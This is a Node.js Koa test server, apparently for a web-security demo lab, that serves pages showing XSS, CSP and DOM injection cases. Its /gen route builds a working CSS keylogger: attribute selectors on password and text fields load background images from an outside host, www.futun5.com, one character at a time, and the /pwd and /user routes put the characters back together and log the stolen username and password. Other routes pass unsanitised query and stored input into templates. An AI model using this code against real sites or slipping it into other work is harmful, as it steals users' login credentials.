/**
 * node ./test/server.js
 */

const UserAgent = require('koa-useragent');
const Koa = require('koa');
const app = new Koa();
const Router = require('koa-router')
const staticServe = require('koa-static');
const logger = require('koa-logger');
const path = require('path');
const bodyParser = require('koa-body');
const exec = require('child_process').exec;
const views = require('koa-views');
const fs = require('fs');


// 静态资源目录对于相对入口文件server.js的路径
const staticPath = path.join(__dirname, './nodeviews');
// 装载路由
app
    // .use(logger())
    .use(UserAgent)
    .use(bodyParser({
    }))
    .use(views(staticPath, {
        map: {
            html: 'ejs'
        }
    }))
    .use(staticServe(staticPath, {
        index: 'jshack.html',
    }));


// 模拟DB
let db = {
    fpath: path.join(__dirname, 'db.txt'),
    get(){
        return fs.readFileSync(this.fpath);
    },
    set(value){
        fs.writeFileSync(this.fpath, value);
    }
};

let user  = '';
let pwd = '';

// 配置路由
let router = new Router();
router.get('/input', async (ctx) => {
    await ctx.render('input.html', {
        data: 'test'
    });
}).get('/gen', async (ctx) => {
    let str = '';
    let str2 = '';
    for (var i = 48; i <= 122; i++) {
        let char = String.fromCharCode(i);
        str += `input[type="password"][value$="${char}"] { background-image: url("http://www.futun5.com:3000/pwd/${char}"); }`;
        str2 += `input[type="text"][value$="${char}"] { background-image: url("http://www.futun5.com:3000/user/${char}"); }`;
    }
    ctx.set("Content-Type", "application/json")
    ctx.body = JSON.stringify({
        pwd: str,
        user: str2
    });
}).get('/view', async (ctx) => {
    let data = db.get();
    await ctx.render('view.html', {
        data: data
    });
}).get('/url', async (ctx) => {
    await ctx.render('url.html', {
        data: ctx.request.query.data
    });
}).get('/base', async (ctx) => {
    await ctx.render('base.html', {
        data: ctx.request.query.data
    });
}).get('/xssprotection', async (ctx) => {
    ctx.set('X-XSS-Protection','1;report=http://localhost:3000/input');
    // ctx.set('Content-Security-Policy', 'default-src https');
    ctx.set('Content-Security-Policy', 'default-src https \'nonce-EDNnf03nceIOfn39fn3e9h3sdfa\'');
    await ctx.render('xssprotection.html', {
        data: ctx.request.query.data
    });
}).get('/dom', async (ctx) => {
    let data = db.get();
    await ctx.render('dom.html', {
        data: data
    });
}).post('/save', async (ctx) => {
    db.set(ctx.request.body.name);
    await ctx.redirect('/view');
}).get('/pwd/:char', async (ctx) => {
    pwd += ctx.params.char;
    if (pwd.length === 6 && user.length === 6){
        console.log(`已破解：账号：${user},密码：${pwd}`);
        pwd = '';
        user = '';
    }
}).get('/user/:char', async (ctx) => {
    user += ctx.params.char;
    if (pwd.length === 6 && user.length === 6) {
        console.log(`已破解：账号：${user},密码：${pwd}`);
        pwd = '';
        user = '';
    }
    ctx.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    ctx.status = 200;
    ctx.type = 'jpg';
    ctx.length = 0;
    ctx.body = Buffer.from('');
});

app.use(router.routes())
    .use(router.allowedMethods())

// 启动server并打开默认链接
app.listen(3000, () => {

    url = 'http://localhost:3000/index.html';
    exec('opener ' + url, function (err, stdout, stderr) {
        console.log(stdout);
    });

    console.log('start on http://localhost:3000');
});
